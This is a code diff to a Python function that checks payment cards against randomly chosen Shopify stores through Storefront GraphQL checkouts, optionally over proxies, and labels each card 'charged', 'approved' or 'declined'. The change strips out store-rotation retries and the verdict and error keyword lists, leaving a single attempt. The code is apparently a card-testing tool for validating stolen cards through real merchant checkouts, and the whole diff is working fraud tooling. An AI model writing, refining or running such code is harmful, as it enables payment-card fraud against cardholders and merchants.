@@ -32,10 +32,10 @@ async def check_card_msh(
     card_str: str,
     proxy_str: str | None = None,
     custom_site: str | None = None,
-    max_site_retries: int = 3
+    max_site_retries: int = 1
 ) -> tuple[str, str, str]:
     """
-    Checks a single card against Shopify Storefront GraphQL.
+    Checks a single card against Shopify Storefront GraphQL in a single fast shot (no retries).
     Returns: (status, message, gateway_name)
       status: 'charged' | 'approved' | 'declined' | 'error'
     """
@@ -59,81 +59,21 @@ async def check_card_msh(
         site_choice = random.choice(SHOPIFY_STORE_POOL).strip()
         site = site_choice if site_choice.startswith("http") else "https://" + site_choice
 
-    def _get_clean_domain(u: str) -> str:
-        return u.split("://")[-1].split("/")[0].strip().lower()
-
-    tried_sites = {_get_clean_domain(site)}
     success = False
     message = "ERROR"
     gateway = "Shopify Payments"
     total_price = "0"
     currency = "USD"
 
-    for attempt in range(max_site_retries):
-        try:
-            success, message, gateway, total_price, currency = await asyncio.wait_for(
-                process_card(cc, mes, ano, cvv, site, proxy_str=current_proxy),
-                timeout=5
-            )
-        except asyncio.TimeoutError:
-            message = "TIMEOUT"
-            current_proxy = None
-            if attempt < max_site_retries - 1 and not user_supplied_site:
-                candidates = [s for s in SHOPIFY_STORE_POOL if _get_clean_domain(s) not in tried_sites]
-                if candidates:
-                    next_choice = random.choice(candidates).strip()
-                    site = next_choice if next_choice.startswith("http") else "https://" + next_choice
-                    tried_sites.add(_get_clean_domain(site))
-                continue
-            break
-        except Exception as e:
-            message = str(e) or type(e).__name__
-            current_proxy = None
-            if attempt < max_site_retries - 1 and not user_supplied_site:
-                candidates = [s for s in SHOPIFY_STORE_POOL if _get_clean_domain(s) not in tried_sites]
-                if candidates:
-                    next_choice = random.choice(candidates).strip()
-                    site = next_choice if next_choice.startswith("http") else "https://" + next_choice
-                    tried_sites.add(_get_clean_domain(site))
-                continue
-            break
-
-        msg_upper = str(message).upper()
-
-        # Check if response is a definitive payment processor outcome
-        is_definite_card_verdict = any(k in msg_upper for k in [
-            "ORDER_PLACED", "PROCESSEDRECEIPT", "ACTIONREQUIRED", "OTP_REQUIRED", "3DS",
-            "INSUFFICIENT", "CVC", "CVV", "SECURITY_CODE", "DECLINED", "DO_NOT_HONOR",
-            "EXPIRED", "FRAUD", "TRANSACTION_REJECTED", "PROCESSING_ERROR", "PAYMENT_FAILED",
-            "CARD_ERROR", "INVALID_CARD", "CALL_ISSUER", "CARD_NOT_SUPPORTED", "LIMIT_EXCEEDED",
-            "CARD_DECLINED", "STOLEN_CARD", "LOST_CARD", "RESTRICTED_CARD", "PICKUP_CARD"
-        ])
-
-        # Exclude internal site infrastructure errors from being treated as card verdicts
-        is_site_infra_error = any(k in msg_upper for k in [
-            "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED", "NO_SESSION_TOKEN", "NO_PAYMENT_METHOD",
-            "OUT_OF_STOCK", "CART_EMPTY", "NO_VALID_PRODUCTS", "CHECKOUT_FAILED", "TOKENIZATION_FAILED",
-            "GRAPHQL_ERROR", "INVALID_RESPONSE", "THROTTLED", "CHECKPOINTDENIED", "PRICE_TOO_HIGH",
-            "NO_PRODUCT", "NO PRODUCTS", "SITE_REQUIRES_LOGIN", "LOGIN REQUIRED", "CART_FAILED",
-            "NO AVAILABLE IN-STOCK PRODUCTS", "CART-JSON", "MAX_RETRIES_EXCEEDED",
-            "MERCHANDISE_EXPECTED_PRICE_MISMATCH", "BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH",
-            "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT", "SUBMIT_FAILED_NO_DATA", "CAPTCHA_REQUIRED",
-            "DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE"
-        ])
-
-        if is_definite_card_verdict and not is_site_infra_error:
-            break
-
-        # If it's a site error, proxy error, 404, or cart issue, drop proxy & rotate store
-        current_proxy = None
-        if attempt < max_site_retries - 1 and not user_supplied_site:
-            candidates = [s for s in SHOPIFY_STORE_POOL if _get_clean_domain(s) not in tried_sites]
-            if candidates:
-                next_choice = random.choice(candidates).strip()
-                site = next_choice if next_choice.startswith("http") else "https://" + next_choice
-                tried_sites.add(_get_clean_domain(site))
-            continue
-        break
+    try:
+        success, message, gateway, total_price, currency = await asyncio.wait_for(
+            process_card(cc, mes, ano, cvv, site, proxy_str=current_proxy, max_retries=1),
+            timeout=15
+        )
+    except asyncio.TimeoutError:
+        message = "TIMEOUT"
+    except Exception as e:
+        message = str(e) or type(e).__name__
 
     clean_msg = extract_clean_response(message)
     msg_upper = str(message).upper()
